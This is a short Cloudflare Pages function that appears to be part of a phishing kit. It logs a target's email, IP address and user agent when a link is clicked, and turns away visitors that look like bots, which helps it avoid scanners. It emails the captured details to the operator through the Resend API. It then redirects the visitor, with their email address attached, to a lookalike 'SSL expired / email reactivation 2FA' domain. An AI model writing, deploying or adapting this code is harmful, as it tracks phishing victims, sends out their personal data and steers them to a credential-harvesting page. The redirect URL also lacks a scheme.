export async function onRequestGet(context) {
  const { searchParams } = new URL(context.request.url);
  const email = searchParams.get("email") || "unknown";
  const ip = context.request.headers.get("CF-Connecting-IP") || "unknown";
  const ua = context.request.headers.get("User-Agent") || "unknown";

  // Bot detection (basic - improve if critical)
  const knownBots = [ /* ... */ ];
  const isBot = knownBots.some(bot => ua.includes(bot)) || ua === "unknown";
  if (isBot) {
    return new Response("Bot access denied", { status: 403 });
  }

  const recipientEmail = context.env.RECIPIENT_EMAIL; // Get from env

  let emailSent = true; // Track success/failure
  try {
    const res = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${context.env.RESEND_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        from: "no-reply@on.resend.dev",
        to: recipientEmail, // Use env variable
        subject: "🔔 Link Clicked",
        text: `Email: ${email}\nIP: ${ip}\nUA: ${ua}\nTime: ${new Date().toISOString()}`,
      }),
    });

     if (!res.ok) { // Check the response status!
        emailSent = false;
        console.error("Resend API error:", await res.text(), res.status); // Log full error
     }

  } catch (err) {
    emailSent = false;
    console.error("Error sending email:", err);
    //  Consider retrying here (using a library or setTimeout)
  }

  // Redirect with status
  const redirectUrl = `sslexpiredemailreactivation2fa.pages.dev?email=${encodeURIComponent(email)}&emailSent=${emailSent}`;
  return Response.redirect(redirectUrl, 302);
}
